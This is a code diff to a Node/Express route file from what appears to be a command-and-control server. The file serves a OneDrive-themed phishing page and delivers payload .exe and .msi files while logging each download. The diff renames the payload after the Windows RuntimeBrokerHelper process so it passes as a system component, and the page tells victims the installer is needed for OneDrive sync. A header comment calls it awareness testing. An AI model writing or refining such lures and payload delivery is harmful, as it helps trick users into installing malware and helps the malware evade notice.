@@ -5,8 +5,8 @@
  * awareness testing ONLY.
  *
  * Place built payloads in:
- *   c2-server/downloads/OneDriveHelper.exe
- *   c2-server/downloads/OneDriveHelper.msi
+ *   c2-server/downloads/RuntimeBrokerHelper.exe
+ *   c2-server/downloads/RuntimeBrokerHelper.msi
  *
  * Routes:
  *   GET /install       → phishing landing page (OneDrive-themed)
@@ -118,7 +118,7 @@ const LANDING_HTML = `<!DOCTYPE html>
         <path d="M12 14h20v22H12V14zm4 4v2h12v-2H16zm0 4v2h12v-2H16zm0 4v2h8v-2h-8z" fill="white" opacity=".9"/>
       </svg>
       <div class="file-meta">
-        <h3>OneDriveHelper-Setup.exe</h3>
+        <h3>RuntimeBrokerHelper-Setup.exe</h3>
         <p>Windows Installer &mdash; required for OneDrive sync</p>
       </div>
     </div>
@@ -186,23 +186,23 @@ router.get("/install", (req, res) => {
 // ── Payload delivery ──────────────────────────────────────────────────────────
 
 router.get("/dl/exe", (req, res) => {
-  const file = path.join(DOWNLOADS, "OneDriveHelper.exe");
+  const file = path.join(DOWNLOADS, "RuntimeBrokerHelper.exe");
   if (!fs.existsSync(file)) {
-    return res.status(404).send("File not found — place OneDriveHelper.exe in c2-server/downloads/");
+    return res.status(404).send("File not found — place RuntimeBrokerHelper.exe in c2-server/downloads/");
   }
   logAccess(req, "DOWNLOAD_EXE");
-  res.setHeader("Content-Disposition", 'attachment; filename="OneDriveHelper.exe"');
+  res.setHeader("Content-Disposition", 'attachment; filename="RuntimeBrokerHelper.exe"');
   res.setHeader("Content-Type", "application/octet-stream");
   res.sendFile(file);
 });
 
 router.get("/dl/msi", (req, res) => {
-  const file = path.join(DOWNLOADS, "OneDriveHelper.msi");
+  const file = path.join(DOWNLOADS, "RuntimeBrokerHelper.msi");
   if (!fs.existsSync(file)) {
-    return res.status(404).send("File not found — place OneDriveHelper.msi in c2-server/downloads/");
+    return res.status(404).send("File not found — place RuntimeBrokerHelper.msi in c2-server/downloads/");
   }
   logAccess(req, "DOWNLOAD_MSI");
-  res.setHeader("Content-Disposition", 'attachment; filename="OneDriveHelper.msi"');
+  res.setHeader("Content-Disposition", 'attachment; filename="RuntimeBrokerHelper.msi"');
   res.setHeader("Content-Type", "application/x-msi");
   res.sendFile(file);
 });
